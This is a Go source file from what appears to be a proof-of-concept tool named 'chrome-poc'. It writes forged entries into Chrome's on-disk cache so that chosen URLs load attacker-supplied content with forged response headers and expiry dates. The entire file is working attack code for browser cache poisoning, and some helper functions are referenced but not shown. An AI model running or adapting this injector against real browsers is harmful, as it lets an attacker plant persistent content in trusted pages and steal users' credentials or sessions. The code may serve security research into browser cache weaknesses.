package injector 

import (
	"fmt"
	"time"
	"net/url"
	"io/ioutil"
	"path/filepath"

	"chrome-poc/injector/platform"
)

type ChromeInjector struct {
	Urls []string
	Content []byte
	ContentType string
	ExpireDate time.Time
	ExtraHttpHeaders []string
}

func (self *ChromeInjector) Inject() {
	cacheDirs := platform.CacheDirs()

	fmt.Printf("Found cache dirs: %v\n", cacheDirs)

	for _, pageUrl := range self.Urls {
		filename, fileData := self.generatePayload(pageUrl)

		for _, dirPath := range cacheDirs {
			path := filepath.Join(dirPath, filename)
			fmt.Printf("  Writing to '%v' for '%v'\n", path, pageUrl)

			ioutil.WriteFile(path, fileData, 0644)
		}
	}
}

func (self *ChromeInjector) generatePayload(urlStr string) (string, []byte) {
	pageUrl, _ := url.Parse(urlStr)
	cacheKey := generateCacheKey(pageUrl)
	eHash := entryHash(cacheKey)
	filename := self.generateFilename(eHash, 0)

	respInfoData := self.persistRespInfo(pageUrl, cacheKey)

	fileData := make([]byte, 0)

	fileData = append(fileData, fileHeader(cacheKey)[4:]...)
	fileData = append(fileData, []byte{ 0, 0, 0, 0 }...)
	fileData = append(fileData, cacheKey...)
	fileData = append(fileData, self.Content...)
	fileData = append(fileData, fileEofData(self.Content, 1)...)

	fileData = append(fileData, respInfoData...)
	fileData = append(fileData, metadataHash(cacheKey)...)
	fileData = append(fileData, fileEofData(respInfoData, 0)...)

	return filename, fileData
}

func (self *ChromeInjector) generateFilename(
    entryHash uint64,
    fileIndex int,
) string {
  	filename := fmt.Sprintf(
		"%x_%1d", 
		entryHash, 
		fileIndex,
  	)
	return filename
}